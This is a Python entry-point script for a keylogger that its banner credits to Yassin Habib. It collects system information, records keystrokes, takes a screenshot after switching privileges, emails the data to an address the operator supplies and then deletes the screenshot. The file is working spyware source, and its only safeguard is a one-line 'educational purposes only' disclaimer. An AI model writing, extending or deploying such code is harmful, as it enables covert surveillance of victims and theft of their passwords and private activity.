import os
import time
import system_info
import keylogger
import email_sender

def drop_privileges(non_root_uid):
    os.seteuid(non_root_uid)

def restore_privileges(original_euid):
    os.seteuid(original_euid)

# Taking screenshots
#we ve put this function in the main.py file because we need to drop privileges before using the pyautogui library 
def screenshot_taker():
    timestamp = time.strftime("%Y%m%d-%H%M%S") 
    filename = f"screenshot_{timestamp}.png"  # Create a filename using the timestamp
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(filename)  # Save the screenshot with the formatted timestamp as name
    return filename 


#  A welcome message 
def welcome_message():
    print("==================================================")
    print(" Welcome to the Keylogger created by Yassin Habib ")
    print("==================================================")
    print("\nThis tool is for educational purposes only. Please ensure you have the proper authorization before proceeding.\n")


if __name__ == "__main__":
    
 
    welcome_message()

    sender_email = input("Enter Sender email: ")
    receiver_email = input("Enter Receiver email: ")
    password = input("Enter your password: ") # here you will need to enter the code given by google authentication
   

    start_time = time.time()
    system_info.gather_all_system_info()
    elapsed_time = time.time() - start_time
    print(f"Gathering info finished after {elapsed_time:.2f} seconds", "\n")

    keylogger.report_keyboard()

    original_euid = os.geteuid()
    non_root_uid = int(os.environ.get('SUDO_UID', original_euid))
    drop_privileges(non_root_uid)

    import pyautogui 
    print("\nTaking screenshot...")
    screenshot_filename = screenshot_taker()

    restore_privileges(original_euid)

    print("\nSending gathered data via email...")
    email_sender.send_email(screenshot_filename, sender_email, receiver_email, password)

    # Delete the screenshot file after sending the email
    os.remove(screenshot_filename)
    print("Screenshot file has been deleted.")

    print("Process completed. Exiting program.")
     

    


